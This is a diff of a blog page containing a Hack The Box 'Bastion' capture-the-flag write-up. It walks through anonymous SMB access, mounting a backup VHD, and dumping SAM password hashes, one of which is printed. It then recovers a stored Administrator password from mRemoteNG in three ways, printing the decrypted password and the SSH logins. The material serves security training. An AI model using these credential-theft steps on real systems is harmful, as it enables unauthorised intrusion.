@@ -1,106 +1,6 @@
-<!DOCTYPE html>
-<html>
+I"�I<p><img src="/images/bastion/infocard.png" alt="" /></p>
 
-    <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Bastion</title>
-<meta name="description" content="A blog">
-
-<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
-<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
-<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
-<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
-<link rel="stylesheet" href="/css/highlightjs.piperita.css">
-
-<!-- Favicons generated at http://realfavicongenerator.net/ -->
-<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="/favicons/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="/favicons/favicon-16x16.png">
-<link rel="manifest" href="/favicons/site.webmanifest">
-<link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#5bbad5">
-<link rel="shortcut icon" href="/favicons/favicon.ico">
-<meta name="msapplication-TileColor" content="#da532c">
-<meta name="msapplication-config" content="/favicons/browserconfig.xml">
-<meta name="theme-color" content="#ffffff">
-
-
-<!-- Go to www.addthis.com/dashboard to customize your tools -->
-<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-513c6fa83da6ec67"></script>
-
-
-
-
-</head>
-
-
-    <body>
-
-    <nav id="my-menu">
-  <div>
-    <p>phaz0n</p>
-
-    <ul class="pages">
-      <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
-      <li><a href="/posts/"><i class="fa fa-archive"></i> All Posts</a></li>
-      <li><a href="/search/"><i class="fa fa-search"></i> Search</a></li>
-    </ul>
-
-    <p class="links">
-  <a href="https://www.twitter.com/_phaz0n" target="_new"><i class="fa fa-twitter"></i></a>
-  
-  
-  
-  
-  <a href="https://github.com/phaz0n" target="_new"><i class="fa fa-github-alt"></i></a>
-  
-  
-  
-  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
-</p>
-
-  </div>
-</nav>
-<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
-
-
-    <div class="page-content">
-      <div class="wrap">
-      
-
-<div class="container-fluid single">
-  <div class="row">
-
-    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
-      
-      <div class="thumb">
-        <i class="fa fa-fort-awesome fa-4x"></i>
-      </div>
-      
-
-      <h1 class="header" itemprop="name">Bastion</h1>
-
-      <div class="author">
-        <small><i>
-          
-          on <span itemprop="datePublished" content="2014-08-28">September 25, 2019</span>
-           under writeup
-        </i></small>
-      </div>
-
-      <div class="read-time">
-        <small>
-          7 minute read
-        </small>
-      </div>
-
-      <div class="content-panel content">
-
-        
-
-        <span itemprop="articleBody"><p><img src="/images/bastion/infocard.png" alt="" /></p>
-
-<p>Bastion is a relatively straightforward box with one strange quirk: to enumerate appropriately, you have to mount a VHD within an SMB share (that you also have to mount…). It isn’t difficult to do these things, but it does take some creative thinking to consider. Privilege escalation involves insecure stored credentials with mRemoteNG. Here, I use a Python script released publicly <em>after</em> this box went live–but others who did the box earlier in its life were able to use the stored credentials in the mRemoteNG GUI itself.</p>
+<p>Bastion is a relatively straightforward box with one strange quirk: to enumerate appropriately, you have to mount a VHD within an SMB share (that you also have to mount…). It isn’t difficult to do these things, but it does take some creative thinking to consider. Privilege escalation leverages the insecure manner in which mRemoteNG stores credentials. You can exploit this in a couple of cool ways through the mRemoteNG GUI itself—or, you can opt for the quick (but forgettable) Python script that wasn’t available until <em>after</em> the box was released.</p>
 
 <h1 id="initial-scan">Initial Scan</h1>
 
@@ -147,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds</code></pre></figur
 
 <h1 id="enumerating-smb">Enumerating SMB</h1>
 
-<p>It’s always worth testing to see if SMB permits null (aka anonymous) sessions. <strong>We need a share</strong> to try authenticating to first. So we list out the shares.</p>
+<p>It’s always worth testing to see if SMB permits null (aka anonymous) sessions. <strong>We need a share</strong> to try authenticating to first. So I list out the shares.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# smbclient -L \\10.10.10.134
 Enter WORKGROUP\root's password:
@@ -173,7 +73,7 @@ smb: \&gt; dir
 
                 7735807 blocks of size 4096. 2745314 blocks available</code></pre></figure>
 
-<p>Our null session worked. We have read access to the <code class="highlighter-rouge">Backups</code> share.</p>
+<p>My null session worked. I have read access to the <code class="highlighter-rouge">Backups</code> share.</p>
 
 <p>Although there aren’t that many files in the share, some are massive. Here’s a quick look of the interesting directory <code class="highlighter-rouge">WindowsImageBackup</code>.</p>
 
@@ -190,32 +90,32 @@ smb: \&gt; dir
 
 <h1 id="mounting-shares-and-vhd-files">Mounting shares and VHD files</h1>
 
-<p>If we mount the share, we can view it as if it were part of our own file system.</p>
+<p>If I mount the share, I can view it as if it were part of my own file system.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# mount -t cifs -o username=anonymous //10.10.10.134/Backups Backups
 Password for anonymous@//10.10.10.134/Backups:  </code></pre></figure>
 
 <p><img src="/images/bastion/image2.png" alt="" /></p>
 
-<p>The VHDs, though, aren’t readable this way. To browse through them, we have to mount those as well. For VHD files, we have to first install <code class="highlighter-rouge">guestmount</code>.</p>
+<p>The VHDs, though, aren’t readable this way. To browse through them, I have to mount those as well. For VHD files, I have to first install <code class="highlighter-rouge">guestmount</code>.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# apt-get install libguestfs-tools</code></pre></figure>
 
-<p>Then we create a new directory as the mountpoint.</p>
+<p>Then I create a new directory as the mountpoint.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# mkdir vhd1</code></pre></figure>
 
-<p>And we mount the VHD file.</p>
+<p>And I mount the VHD file.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# guestmount --add "/root/Backups/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" --inspector --ro /root/vhd1 -v</code></pre></figure>
 
-<p>Now we can browse through the file system as if it were part of our own.</p>
+<p>Now I can browse through the file system as if it were part of my own.</p>
 
 <p><img src="/images/bastion/image3.png" alt="" /></p>
 
 <p><em>Note: One of the VHDs wouldn’t mount properly. Turns out it isn’t necessary to mount anyway.</em></p>
 
-<p>Now with read access to the VHD, my first instinct is to go for the <strong>flags</strong>, but there’s nothing at <code class="highlighter-rouge">C:\Users\L4mpje\Desktop</code> or <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code>. So we clearly don’t have the right access just yet.</p>
+<p>Now with read access to the VHD, my first instinct is to go for the <strong>flags</strong>, but there’s nothing at <code class="highlighter-rouge">C:\Users\L4mpje\Desktop</code> or <code class="highlighter-rouge">C:\Users\Administrator\Desktop</code>. So I clearly don’t have the right access just yet.</p>
 
 <p>Next thing to do would be to search for <strong>user credentials</strong>. After checking for credentials lying around in obvious places, I go for the SAM and SECURITY files.</p>
 
@@ -253,7 +153,7 @@ L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 
 <p><img src="/images/bastion/image4.png" alt="" /></p>
 
-<p>To get in, we <code class="highlighter-rouge">ssh</code> as <strong>L4mpje@10.10.10.134</strong> with the recovered password.</p>
+<p>To get in, I <code class="highlighter-rouge">ssh</code> as <strong>L4mpje@10.10.10.134</strong> with the recovered password.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# ssh L4mpje@10.10.10.134
 L4mpje@10.10.10.134's password: 
@@ -295,7 +195,7 @@ l4mpje@BASTION C:\Users\L4mpje&gt;    </code></pre></figure>
                0 File(s)              0 bytes                                   
               14 Dir(s)  11.244.994.560 bytes free                              </code></pre></figure>
 
-<p>We can find the version number in the changelog file and search for a known exploit, but this doesn’t get us very far.</p>
+<p>I can find the version number in the changelog file and search for a known exploit, but this doesn’t get us very far.</p>
 
 <p>A search for “mRemoteNG stored credentials”, however, results in <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">exactly what we’re looking for</a>:</p>
 
@@ -303,121 +203,73 @@ l4mpje@BASTION C:\Users\L4mpje&gt;    </code></pre></figure>
   <p>mRemoteNG uses insecure methods for password storage and can provide droves of valid credentials during an assessment or competition.</p>
 </blockquote>
 
-<p>As the post explains, mRemoteNG is used to help manage remote connections (e.g., SSH, RDP). Credentials for these sessions may be stored insecurely in a file called <code class="highlighter-rouge">confCons.xml</code>. Lo and behold, we can find an encrypted password (right beside <strong>Username=”Administrator”</strong>) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.</p>
+<p>As the post explains, mRemoteNG is used to help manage remote connections (e.g., SSH, RDP). Credentials for these sessions may be stored insecurely in a file called <code class="highlighter-rouge">confCons.xml</code>. Lo and behold, I can find an encrypted password (right beside <strong>Username=”Administrator”</strong>) in C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml.</p>
 
 <figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;Node</span> <span class="na">Name=</span><span class="s">"DC"</span> <span class="na">Type=</span><span class="s">"Connection"</span> <span class="na">Descr=</span><span class="s">""</span> <span class="na">Icon=</span><span class="s">"mRemoteNG"</span> <span class="na">Panel=</span><span class="s">"General"</span> <span class="na">Id=</span><span class="s">"500e7d58-662a-44d4-aff0-3a4f547a3fee"</span> <span class="na">Username=</span><span class="s">"Administrator"</span> <span class="na">Domain=</span><span class="s">""</span> <span class="na">Password=</span><span class="s">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span> <span class="na">Hostname=</span><span class="s">"127.0.0.1"</span> <span class="na">Protocol=</span><span class="s">"RDP"</span> <span class="err">.</span> <span class="err">.</span> <span class="err">.</span> </code></pre></figure>
 
-<p>This specifies that the protocol is RDP. We can assume that this credential would be reused for SSH as well.</p>
+<p>This specifies that the protocol is RDP. We can assume that this credential would be reused for SSH as well. We can abuse these stored credentials in a few different ways.</p>
 
-<p>You can find a handful of options available for decrypting an mRemoteNG password. The previously linked-to <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">blog post</a> describes a method via the GUI, which seems to be the intended way in this box.</p>
+<h3 id="method-1-extended-tools-password-lookup">Method 1: Extended Tools password lookup</h3>
 
-<p>What worked best for me was <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG_Decrypt.py</a>. I copied the encrypted password and passed it as a string to get the plaintext credential.</p>
+<p>The previously linked-to <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">blog post</a> describes a method via the GUI, which seems to be the intended way in this box. I switch over to a Windows VM, download mRemoteNG, and start it up.</p>
 
-<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
-Password: thXLHM96BeKL0ER2</code></pre></figure>
+<p><img src="/images/bastion/image10.PNG" alt="" /></p>
 
-<p>From here, we simply have to SSH in as Administrator.</p>
+<p>I import the confCons.xml file by going to <strong>File &gt; Open Connection File…</strong> I see two saved connections.</p>
+
+<p><img src="/images/bastion/image11.PNG" alt="" /></p>
+
+<p>“DC” is the one we’re after. This is the stored Administrator RDP connection.</p>
+
+<p><img src="/images/bastion/image12.PNG" alt="" /></p>
+
+<p>The <a href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">blog post</a> explains that I need to create a new Extended Tool that acts as a password decrypter. I go to <strong>Tools &gt; External Tools</strong> and click <strong>New</strong>.</p>
+
+<ul>
+  <li>Display Name can be anything really. (I put <code class="highlighter-rouge">Password Lookup</code> per the blog.)</li>
+  <li>Filename should be <code class="highlighter-rouge">CMD</code>.</li>
+  <li>Arguments should be <code class="highlighter-rouge">/k echo %password%</code>.
+<br />
+<br />
+<img src="/images/bastion/image13.PNG" alt="" /></li>
+</ul>
+
+<p>Once the tool is created, I right-click the connection (DC) and select <strong>External Tools &gt; Password Lookup</strong>. A command prompt appears with the password in cleartext.</p>
+
+<p><img src="/images/bastion/image14.PNG" alt="" /></p>
+
+<p>With these credentials, I can SSH in as Administrator . . .</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# ssh Administrator@10.10.10.134
 Administrator@10.10.10.134's password: </code></pre></figure>
 
-<p>And the root flag is in Administrator’s Desktop folder.</p>
+<p>. . . and grab the flag.</p>
 
 <figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">administrator@BASTION C:\Users\Administrator&gt; type Desktop\root.txt                                                             
 9588############################</code></pre></figure>
-</span>
 
-        
+<h3 id="method-2-connecting-directly-from-mremoteng">Method 2: Connecting directly from mRemoteNG</h3>
 
-        
-        <div class="share">
-          <!-- Go to www.addthis.com/dashboard to customize your tools -->
-          <div class="addthis_sharing_toolbox"></div>
-        </div>
-        
-        
-        <div class="htb signature">
-        	<a href="https://www.hackthebox.eu/profile/27646">
-        		<img src="https://www.hackthebox.eu/badge/image/27646)">
-        	</a>
-        </div>
+<p>We actually don’t have to uncover the password at all to get Administrator access. If you’ve started up mRemoteNG and imported confCons.xml, just:</p>
 
-        
-        <div class="tags">
-          <small>
-          <i class="fa fa-tags"></i>
-            hackthebox, writeup, walkthrough
-          </small>
-        </div>
-        
+<ul>
+  <li>Change the IP address from 127.0.0.1 to 10.10.10.134.</li>
+  <li>Change the connection method from RDP to SSH version 2. (Our nmap scan showed SSH but not RDP.)
+<br />
+<br />
+<img src="/images/bastion/image16.PNG" alt="" /></li>
+</ul>
 
-      </div>
+<p>Right-click the connection (DC) from the connections list, click <strong>Connect</strong>, and you’ll have an interactive SSH session as Administrator.</p>
 
-    
-      
-      <div class="content-panel comments">
-        <div id="disqus_thread">
-          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-      </div>
-      
+<p><img src="/images/bastion/image17.PNG" alt="" /></p>
 
-      
+<h3 id="method-3-decrypting-with-mremoteng_decryptpy">Method 3: Decrypting with mremoteng_decrypt.py</h3>
 
-    </div>
+<p>Sometime after the box was released, a neat script called <a href="https://github.com/haseebT/mRemoteNG-Decrypt">mRemoteNG_Decrypt.py</a> popped up. All you have to do is copy the encrypted password from confCons.xml and pass it as a string to get the plaintext credential.</p>
 
-  </div>
+<figure class="highlight"><pre><code class="language-plaintext" data-lang="plaintext">root@kali:~# python3 mremoteng_decrypt.py -s "aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
+Password: thXLHM96BeKL0ER2</code></pre></figure>
 
-</div>
-
-
-<script type="text/javascript">
-/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-function disqus_config() { this.experiment.enable_scroll_container = true; }
-var disqus_shortname = "phaz0n"; // required: replace example with your forum shortname
-/* * * DON'T EDIT BELOW THIS LINE * * */
-(function() {
-  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-  dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-})();
-</script>
-
-
-      </div>
-    </div>
-
-    <div class="footer clearfix">
-  <div class="col-md-6">
-    Theme by <a href="https://twitter.com/_JacobTomlinson">Jacob Tomlinson</a>
-  </div>
-  <div class="col-md-6">
-    phaz0n on <a href="https://github.com/phaz0n">Github</a> &nbsp;<i class="fa fa-github-alt"></i>
-  </div>
-</div>
-
-<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
-<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
-<script src="/js/jquery.mmenu.min.all.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
-<script type="text/javascript">
-   $(document).ready(function() {
-      $("#my-menu").mmenu().on( "closed.mm", function() {
-            $(".menu-button").show();
-         });
-      $(".menu-button").click(function() {
-        $(".menu-button").hide();
-        $("#my-menu").trigger("open.mm");
-      });
-   });
-</script>
-
-
-
-
-
-
-    </body>
-</html>
+<p>Not as satisfying as the other methods, but it’s always good to have a quick-and-dirty way that doesn’t involve spinning up a separate Windows environment and installing software.</p>
+:ET
